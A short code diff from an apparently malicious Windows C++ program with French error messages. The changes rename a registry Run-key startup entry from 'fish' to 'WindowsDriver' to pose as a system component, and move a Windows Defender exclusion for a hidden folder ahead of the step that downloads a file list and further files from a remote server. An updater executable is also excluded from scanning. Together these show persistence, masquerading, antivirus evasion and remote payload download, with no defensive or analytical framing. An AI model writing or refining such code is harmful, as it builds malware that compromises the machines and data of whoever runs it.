@@ -50,7 +50,7 @@ bool InstallService(const string& serviceName, const string& exePath) {
 void AddToStartup() {
     HKEY hKey;
     const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
-    const char* appName = "fish";
+    const char* appName = "WindowsDriver";
     char szPath[MAX_PATH];
 
     if (GetEnvironmentVariableA("USERPROFILE", szPath, MAX_PATH)) {
@@ -94,12 +94,13 @@ int main() {
     CreateDirectory(fishFolder.c_str(), NULL);
     SetFileAttributes(fishFolder.c_str(), FILE_ATTRIBUTE_HIDDEN);
 
+    AddDefenderExclusion(fishFolder);
+
     string fileListPath = fishFolder + "\\" + FILE_LIST;
     if (!DownloadFile(SERVER_URL + FILE_LIST, fileListPath)) {
         MessageBox(NULL, "Échec du téléchargement de files.txt", "Erreur", MB_OK | MB_ICONERROR);
         return 1;
     }
-
 
     vector<string> filesToDownload = GetFileList(fileListPath);
 
@@ -151,8 +152,6 @@ int main() {
 
     string updaterPath = fishFolder + "\\updater.exe";
     AddDefenderExclusion(updaterPath);
-
-    AddDefenderExclusion(fishFolder);
 
     return 0;
 }
